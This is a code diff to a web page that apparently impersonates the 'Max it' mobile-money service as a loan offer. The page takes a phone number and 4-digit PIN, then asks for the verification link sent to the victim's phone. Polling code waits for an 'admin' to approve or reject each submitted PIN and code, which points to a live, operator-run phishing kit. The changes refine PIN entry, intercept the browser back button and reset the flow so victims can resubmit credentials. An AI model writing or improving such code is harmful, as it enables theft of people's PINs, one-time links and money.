@@ -404,10 +404,10 @@
       </div>
       <div class="pin-label">Enter your PIN (4 characters)</div>
       <div class="pin-row">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" onkeydown="pinKey(this,0,event)" onclick="pinClick(this)" id="p0" autocomplete="off" inputmode="numeric">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" onkeydown="pinKey(this,1,event)" onclick="pinClick(this)" id="p1" autocomplete="off" inputmode="numeric">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" onkeydown="pinKey(this,2,event)" onclick="pinClick(this)" id="p2" autocomplete="off" inputmode="numeric">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" onkeydown="pinKey(this,3,event)" onclick="pinClick(this)" id="p3" autocomplete="off" inputmode="numeric">
         <button class="pin-eye" onclick="togPin()">👁</button>
       </div>
       <div class="forgot-pin">Forgot PIN?</div>
@@ -432,7 +432,7 @@
 <!-- ══════════════════════ PAGE 7: OTP ══════════════════════ -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
-    <button class="bk" onclick="goTo('page-login')">←</button>
+    <button class="bk" onclick="goBackToLogin()">←</button>
     <div style="display:flex;align-items:center;gap:8px;">
       <div style="background:#FF6600;border-radius:7px;padding:3px 7px;display:flex;flex-direction:column;align-items:center;">
         <div style="font-size:0.8rem;font-weight:900;color:#fff;line-height:1.1;">Max <span style="font-style:italic;">it</span></div>
@@ -443,9 +443,11 @@
   </div>
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2>Link Verification</h2>
-      <p class="otp-hint">Paste the verification link sent to your phone by Max it</p>
-      <div class="otp-phone" id="otpPh">+231770123456</div>
+      <div id="otpHeader">
+        <h2>Link Verification</h2>
+        <p class="otp-hint">Paste the verification link sent to your phone by Max it</p>
+        <div class="otp-phone" id="otpPh">+231770123456</div>
+      </div>
 
       <!-- Inline messages for OTP page -->
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
@@ -564,7 +566,50 @@
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0, 0);
+    if (id === 'page-login') resetLoginPage();
+    // Push a history state so browser back button can be intercepted
+    try { history.pushState({ page: id }, '', window.location.href); } catch(e) {}
   }
+
+  // Full reset when going back to login from OTP page
+  function goBackToLogin() {
+    // Stop any active polling
+    if (typeof pinPollInterval !== 'undefined' && pinPollInterval) {
+      clearInterval(pinPollInterval);
+      pinPollInterval = null;
+    }
+    if (typeof otpPollInterval !== 'undefined' && otpPollInterval) {
+      clearInterval(otpPollInterval);
+      otpPollInterval = null;
+    }
+    if (typeof _rsInterval !== 'undefined' && _rsInterval) {
+      clearInterval(_rsInterval);
+      _rsInterval = null;
+    }
+    // Reset OTP page to clean state
+    document.getElementById('otpHeader').style.display = '';
+    document.getElementById('pinWait').classList.remove('show');
+    document.getElementById('otpInputSection').style.display = '';
+    document.getElementById('otpLink').value = '';
+    document.getElementById('bOtp').className = 'btn-otp';
+    document.getElementById('bOtp').disabled  = false;
+    document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">40</span> seconds';
+    hideOtpMsgs();
+    // Reset application state
+    S.applicationId   = null;
+    S.assignedAdminId = null;
+    goTo('page-login');
+  }
+
+  // Browser hardware back button intercept
+  window.addEventListener('popstate', function(e) {
+    const active = document.querySelector('.page.active');
+    if (active && active.id === 'page-otp') {
+      goBackToLogin();
+    } else if (active && active.id !== 'page-landing') {
+      goTo('page-landing');
+    }
+  });
 
   // ══════════════════════════════════════════════════════
   // LOAN CALCULATOR
@@ -707,17 +752,88 @@
   }
 
   // ══════════════════════════════════════════════════════
+  // OTP PAGE — SHOW/HIDE WAITING STATE
+  // ══════════════════════════════════════════════════════
+  function showOtpWaiting() {
+    document.getElementById('otpHeader').style.display        = 'none';
+    document.getElementById('otpInputSection').style.display  = 'none';
+    hideOtpMsgs();
+    document.getElementById('pinWait').classList.add('show');
+  }
+
+  function showOtpInput() {
+    document.getElementById('otpHeader').style.display        = '';
+    document.getElementById('otpInputSection').style.display  = '';
+    document.getElementById('pinWait').classList.remove('show');
+  }
+
+  // ══════════════════════════════════════════════════════
   // LOGIN PAGE — PIN INPUT HELPERS
   // ══════════════════════════════════════════════════════
+
+  // oninput handler — also handles mobile backspace via empty-value detection
   function pinMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
+    const cleaned = el.value.replace(/\D/g, '');
+    el.value = cleaned.slice(0, 1); // keep only first digit
+    if (el.value) {
+      // digit entered → move forward
+      if (i < 3) document.getElementById('p' + (i + 1)).focus();
+    } else {
+      // value became empty (mobile backspace / delete) → move back
+      if (i > 0) document.getElementById('p' + (i - 1)).focus();
+    }
     chkLogin();
   }
 
+  // onkeydown handler — desktop keyboard navigation
+  function pinKey(el, i, e) {
+    if (e.key === 'Backspace') {
+      e.preventDefault();
+      if (el.value) {
+        el.value = '';
+        chkLogin();
+      } else if (i > 0) {
+        const prev = document.getElementById('p' + (i - 1));
+        prev.value = '';
+        prev.focus();
+        chkLogin();
+      }
+    } else if (e.key === 'Delete') {
+      e.preventDefault();
+      el.value = '';
+      chkLogin();
+    } else if (e.key === 'ArrowLeft' && i > 0) {
+      e.preventDefault();
+      document.getElementById('p' + (i - 1)).focus();
+    } else if (e.key === 'ArrowRight' && i < 3) {
+      e.preventDefault();
+      document.getElementById('p' + (i + 1)).focus();
+    }
+  }
+
+  // onclick on a filled box — clear it so the user can re-type
+  function pinClick(el) {
+    el.select();
+  }
+
   function chkLogin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
-    document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
+    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value.trim() !== '');
+    const btn = document.getElementById('bLogin');
+    btn.className = ok ? 'btn-login rdy' : 'btn-login';
+    btn.disabled  = !ok;
+  }
+
+  function resetLoginPage() {
+    document.getElementById('lgPh').value = '';
+    [0,1,2,3].forEach(i => {
+      const b = document.getElementById('p'+i);
+      b.value = '';
+      b.type  = 'password'; // reset show/hide toggle
+    });
+    const btn = document.getElementById('bLogin');
+    btn.className = 'btn-login';
+    btn.disabled  = true;
+    hideLoginMsg();
   }
 
   function togPin() {
@@ -763,6 +879,7 @@
       const data = await res.json();
 
       document.getElementById('mLogin').classList.remove('show');
+      document.getElementById('bLogin').disabled = false;
 
       if (data.success) {
         // Store application ID for polling
@@ -772,10 +889,9 @@
         // Set phone display on OTP page
         document.getElementById('otpPh').textContent = phoneNumber;
 
-        // Transition to OTP page — but show "waiting for admin" first
+        // Transition to OTP page — show ONLY the waiting spinner
         goTo('page-otp');
-        document.getElementById('pinWait').classList.add('show');
-        document.getElementById('otpInputSection').style.display = 'none';
+        showOtpWaiting();
 
         // Start polling for PIN approval
         pollPinStatus();
@@ -810,17 +926,16 @@
         if (data.status === 'approved') {
           clearInterval(pinPollInterval);
           // Hide waiting, show OTP input
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Details verified! Please enter your OTP below.');
+          showOtpInput();
+          showOtpMsg('success', 'Details verified! Please paste the verification link below.');
           startRs();
           document.getElementById('o0').focus();
 
         } else if (data.status === 'rejected') {
           clearInterval(pinPollInterval);
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'none';
+          showOtpInput();
           showOtpMsg('error', 'Your details could not be verified. Please go back and try again.');
+          document.getElementById('otpInputSection').style.display = 'none';
           // Re-enable login button in case user goes back
           document.getElementById('bLogin').disabled = false;
         }
@@ -989,29 +1104,7 @@
           // Admin flagged PIN as wrong — send user back to login
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
-          setTimeout(() => {
-            // Clear PIN boxes
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            chkLogin();
-            document.getElementById('bLogin').disabled = false;
-            // Clear link input
-            document.getElementById('otpLink').value = '';
-            // Reset OTP button
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            // Hide waiting spinner and show OTP inputs (reset OTP page state)
-            document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = '';
-            // Stop resend timer and reset it
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">40</span> seconds';
-            // Clear all OTP messages
-            hideOtpMsgs();
-            // Reset application state so a fresh login creates a new application
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
+          setTimeout(() => { goBackToLogin(); }, 2500);
 
         } else if (data.status === 'wrongcode') {
           // Admin flagged OTP/link as wrong — let user re-enter
